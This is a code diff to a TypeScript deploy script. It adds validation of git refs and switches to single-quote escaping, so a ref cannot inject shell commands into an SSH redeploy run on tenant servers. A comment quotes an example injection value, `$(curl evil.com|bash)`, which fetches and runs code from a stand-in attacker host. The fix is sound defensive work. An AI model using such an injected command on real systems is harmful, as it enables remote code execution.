@@ -54,6 +54,28 @@ type Args = {
   json: boolean;
 };
 
+/**
+ * Validate a git ref against the loose-but-safe set of characters git
+ * itself documents as legal in branch / tag names: alphanumerics, plus
+ * `-`, `_`, `.`, `/`. Crucially excludes `$`, backticks, single/double
+ * quotes, and whitespace — those are the only metacharacters bash
+ * could expand inside the SSH command, and the empty intersection
+ * means we can safely interpolate the ref into any quoting context on
+ * the remote shell.
+ *
+ * Bugbot Medium on PR #74 flagged the previous `JSON.stringify(ref)`
+ * approach because bash double-quoted values still expand `$(...)`
+ * and backticks, so a ref like `$(curl evil.com|bash)` would have
+ * executed on every tenant VPS via SSH.
+ */
+function assertSafeGitRef(ref: string): void {
+  if (!/^[A-Za-z0-9._/-]+$/.test(ref) || ref.startsWith("-") || ref.includes("..")) {
+    throw new Error(
+      `unsafe git ref ${JSON.stringify(ref)}: must match /^[A-Za-z0-9._/-]+$/, not start with '-', and not contain '..'`
+    );
+  }
+}
+
 function parseArgs(argv: string[]): Args {
   const out: Args = { ref: "main", businessId: null, json: false };
   for (let i = 0; i < argv.length; i += 1) {
@@ -68,6 +90,7 @@ function parseArgs(argv: string[]): Args {
       process.exit(0);
     }
   }
+  assertSafeGitRef(out.ref);
   return out;
 }
 
@@ -97,9 +120,20 @@ async function listTargets(businessId: string | null): Promise<TenantTarget[]> {
  * rotations stay confined to the full deploy path.
  */
 function buildBridgeRedeployCommand(ref: string): string {
+  // Defence-in-depth: parseArgs() already enforces /^[A-Za-z0-9._/-]+$/
+  // (no shell metachars), but re-assert here so this builder remains
+  // safe for any future caller that bypasses parseArgs.
+  assertSafeGitRef(ref);
+  // Wrap the ref in SINGLE quotes so bash performs zero expansion on
+  // it. Bash double-quotes still expand `$(...)` and backticks, which
+  // is why the previous JSON.stringify approach was unsafe (Bugbot
+  // Medium on PR #74). Combined with the assertSafeGitRef above —
+  // which excludes `'` from the allowed character set — single
+  // quoting is unambiguous: there is no way the literal could close
+  // the surrounding `'` and re-open command-substitution.
   return `set -euo pipefail
 NEWCOWORKER_REPO_PATH="/opt/newcoworker-repo"
-NEWCOWORKER_REPO_REF=${JSON.stringify(ref)}
+NEWCOWORKER_REPO_REF='${ref}'
 NEWCOWORKER_REPO_URL="https://github.com/brianlane/newCoworker.git"
 VOICE_BRIDGE_SRC="\${NEWCOWORKER_REPO_PATH}/vps/voice-bridge"
 VOICE_BRIDGE_DEST="/opt/voice-bridge"
